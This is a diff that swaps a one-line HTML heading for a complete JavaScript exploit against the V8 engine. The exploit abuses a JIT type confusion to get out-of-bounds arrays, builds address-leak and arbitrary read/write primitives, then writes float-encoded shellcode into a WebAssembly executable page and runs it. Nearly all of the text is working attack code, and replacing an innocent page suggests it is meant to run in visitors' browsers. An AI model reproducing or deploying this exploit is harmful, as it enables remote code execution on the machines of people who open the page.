@@ -1,1 +1,78 @@
-<h1>love you baby</h1>
+let conversion_buffer = new ArrayBuffer(8);
+let float_view = new Float64Array(conversion_buffer);
+let int_view = new BigUint64Array(conversion_buffer);
+BigInt.prototype.hex = function() {
+    return '0x' + this.toString(16);
+};
+BigInt.prototype.i2f = function() {
+    int_view[0] = this;
+    return float_view[0];
+}
+Number.prototype.f2i = function() {
+    float_view[0] = this;
+    return int_view[0];
+}
+function gc() {
+		for(let i=0; i<((1024 * 1024)/0x10); i++) {
+			  var a = new String();
+		}
+}
+
+let shellcode = [2.40327734437787e-310, -1.1389104046892079e-244, 3.1731330715403803e+40, 1.9656830452398213e-236, 1.288531947997e-312, 8.3024907661975715e+270, 1.6469439731597732e+93, 9.026845734376378e-308];
+
+function pwn() {
+    /* Prepare RWX */
+    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+    let module = new WebAssembly.Module(buffer);
+    var instance = new WebAssembly.Instance(module);
+    var exec_shellcode = instance.exports.main;
+ function f(a) {
+        let x = -1;
+        if (a) x = 0xFFFFFFFF;
+        let oob_smi = new Array(Math.sign(0 - Math.max(0, x, -1)));
+        oob_smi.pop();
+        let oob_double = [3.14, 3.14];
+        let arr_addrof = [{}];
+        let aar_double = [2.17, 2.17];
+        let www_double = new Float64Array(8);
+        return [oob_smi, oob_double, arr_addrof, aar_double, www_double];
+    }
+    gc();
+
+    for (var i = 0; i < 0x10000; ++i) {
+        f(false);
+    }
+    let [oob_smi, oob_double, arr_addrof, aar_double, www_double] = f(true);
+    console.log("[+] oob_smi.length = " + oob_smi.length);
+    oob_smi[14] = 0x1234;
+    console.log("[+] oob_double.length = " + oob_double.length);
+
+    let primitive = {
+        addrof: (obj) => {
+            arr_addrof[0] = obj;
+            return (oob_double[8].f2i() >> 32n) - 1n;
+        },
+        half_aar64: (addr) => {
+            oob_double[15] = ((oob_double[15].f2i() & 0xffffffff00000000n)
+                              | ((addr - 0x8n) | 1n)).i2f();
+            return aar_double[0].f2i();
+        },
+        full_aaw: (addr, values) => {
+            oob_double[27] = 0x8888n.i2f();
+            oob_double[28] = addr.i2f();
+            for (let i = 0; i < values.length; i++) {
+                www_double[i] = values[i];
+            }
+        }
+    };
+
+    console.log(primitive.addrof(oob_double).hex());
+    let addr_instance = primitive.addrof(instance);
+    console.log("[+] instance = " + addr_instance.hex());
+    let addr_shellcode = primitive.half_aar64(addr_instance + 0x68n);
+    console.log("[+] shellcode = " + addr_shellcode.hex());
+    primitive.full_aaw(addr_shellcode, shellcode);
+    console.log("[+] GO");
+    exec_shellcode();
+    return;
+}
